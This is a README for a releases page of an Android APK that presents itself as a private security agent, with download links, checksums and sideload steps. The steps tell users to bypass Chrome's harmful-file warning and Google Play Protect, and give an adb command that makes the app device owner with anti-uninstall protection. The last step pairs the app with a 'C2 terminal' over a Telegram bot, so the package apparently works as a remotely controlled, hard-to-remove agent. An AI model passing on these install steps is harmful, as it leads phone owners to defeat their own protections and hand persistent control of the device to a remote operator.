# 📦 PASA Sentinel APK Releases

This directory hosts verified production release binaries of **PASA Sentinel (Private Android Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`pasa-v3.7.15-80.apk`** | `v3.7.15` (Latest Production) | Build 80 | 18.42 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/pasa-v3.7.15-80.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 80 | 18.42 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **`PASA-Device-Owner-Setup-Kit.zip`** | Guided Setup Wizard | Windows ADB | 12.3 KB | [Download Kit](https://github.com/rbr48/pasa/raw/main/releases/PASA-Device-Owner-Setup-Kit.zip) |

* **High-Speed Global CDN Mirror:** [https://pasa.izhaanintellect.fun/releases/pasa-latest.apk](https://pasa.izhaanintellect.fun/releases/pasa-latest.apk)
* **Historical Releases & OTA Manifest:** [https://pasa.izhaanintellect.fun/api/app/latest](https://pasa.izhaanintellect.fun/api/app/latest)
* **Public Audit & SARIF Portal:** [https://pasa.izhaanintellect.fun/audit/](https://pasa.izhaanintellect.fun/audit/)

---

## 🔐 Cryptographic Integrity (v3.7.15 Build 80)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `pasa-v3.7.15-80.apk` / `pasa-latest.apk`
* **File Size:** `19,315,370 bytes` (18.42 MB)
* **SHA-256 Checksum:**
  ```text
  e6bc80e11f207f382736a1af1c314ab8311a2c1afddc6a2464fe69a6054dd44e
  ```
* **Setup Kit SHA-256:**
  ```text
  f5dfe1893638e2712556e705eb632c5800381324dbe7782b7d4c52c403542f63
  ```
* **VirusTotal Multi-AV Consensus:** [Inspect 65/66 Clean Report](https://www.virustotal.com/gui/file/e6bc80e11f207f382736a1af1c314ab8311a2c1afddc6a2464fe69a6054dd44e)

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash pasa-latest.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum pasa-latest.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows an unknown app notice, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#-complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
